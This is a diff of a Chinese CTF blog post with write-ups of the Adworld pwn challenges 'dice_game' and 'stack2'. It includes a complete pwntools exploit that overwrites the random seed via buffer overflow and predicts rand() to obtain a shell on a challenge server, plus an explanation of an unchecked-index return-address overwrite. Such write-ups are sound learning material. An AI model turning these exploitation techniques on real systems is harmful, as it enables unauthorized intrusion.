@@ -92,7 +92,9 @@
 <meta property="og:description" content="自古有一就有二，有二也不一定有三。鸽子才是本质。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://s2.ax1x.com/2019/08/24/mykjgJ.png">
-<meta property="og:updated_time" content="2019-09-01T11:18:38.159Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/02/nid579.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/03/nk39Ln.png">
+<meta property="og:updated_time" content="2019-09-03T08:17:49.118Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界自闭之路&lt;二&gt;">
 <meta name="twitter:description" content="自古有一就有二，有二也不一定有三。鸽子才是本质。">
@@ -305,8 +307,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-01T19:18:38+08:00">
-                2019-09-01
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-03T16:17:49+08:00">
+                2019-09-03
               </time>
             
           </span>
@@ -333,7 +335,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  98 字
+                  538 字
                 </span>
               
 
@@ -349,7 +351,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1 分钟
+                  2 分钟
                 </span>
               
             </div>
@@ -373,9 +375,20 @@
         <p>自古有一就有二，有二也不一定有三。鸽子才是本质。</p>
 <a id="more"></a>
 <h1 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h1><blockquote>
+<p>覆盖seed随机值</p>
 </blockquote>
 <h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p> <img src="https://s2.ax1x.com/2019/08/24/mykjgJ.png" alt></p>
+<p>原函数中的意思是猜50次随机数，才能直接进入函数/bin/sh。在前面一篇的一个题目是一样的解法。就不多bb了，直接上exp</p>
 <h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p =process("./dice_game")</span></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">38522</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x40</span> * <span class="string">'A'</span> +p64(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,payload)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">libc.srand(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">":"</span>,str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h1><blockquote>
+<p>覆盖地址段，跳转到合适的位置</p>
+</blockquote>
+<p>之前没见过这种解题方法，对于菜单题是真的没做过。我宛如个憨憨，但是理解这道题之后就发现其实真的简单，我看不懂字符串后面的\n是个什么，以为是截断什么鬼的，后来自己拿着别人的payload调试一遍了之后才发现只是一个回车而已= =  我真菜，这么简单的题都不会</p>
+<h2 id="检查保护-1"><a href="#检查保护-1" class="headerlink" title="检查保护"></a>检查保护</h2><p> <img src="https://s2.ax1x.com/2019/09/02/nid579.png" alt></p>
+<p>开了nx和canary的程序下，应该不是能ROP的题目。那就看看伪代码先</p>
+<h2 id="ida查看伪代码"><a href="#ida查看伪代码" class="headerlink" title="ida查看伪代码"></a>ida查看伪代码</h2><p> <img src="https://s2.ax1x.com/2019/09/03/nk39Ln.png" alt></p>
+<p>一长段代码里面能看到的这个函数的基本功能是一个计算器的菜单格式，漏洞在再次更改之后的地方。程序没有限制这个的大小就能直接跳转函数的地址偏移，也就是说我不管更改哪里的地址在函数中都是可行的。这道题我以为题解看到这里我就能做了，然后我就去做了，漏洞都找到了，就好办了，我是这么想的。</p>
+<p>但是很迷，偏移算不对。理论上来说直接覆盖完栈就可了，直接拿来就算的话就是0x74的值，但是这个不对。题解里面说动态调试，那就现学一波动态调试。ida的动态调试参考<a href="https://blog.csdn.net/abc_670/article/details/80066817" target="_blank" rel="noopener">这篇文章</a> 配置完之后直接用你就能直接动态调试到数据段的值</p>
 
       
     </div>
@@ -567,7 +580,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dice-game"><span class="nav-number">1.</span> <span class="nav-text">dice_game</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护"><span class="nav-number">1.1.</span> <span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp"><span class="nav-number">1.2.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dice-game"><span class="nav-number">1.</span> <span class="nav-text">dice_game</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护"><span class="nav-number">1.1.</span> <span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp"><span class="nav-number">1.2.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack2"><span class="nav-number">2.</span> <span class="nav-text">stack2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护-1"><span class="nav-number">2.1.</span> <span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ida查看伪代码"><span class="nav-number">2.2.</span> <span class="nav-text">ida查看伪代码</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -603,7 +616,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">5.5k</span>
+    <span title="Site words total count">5.9k</span>
   
 </div>
 
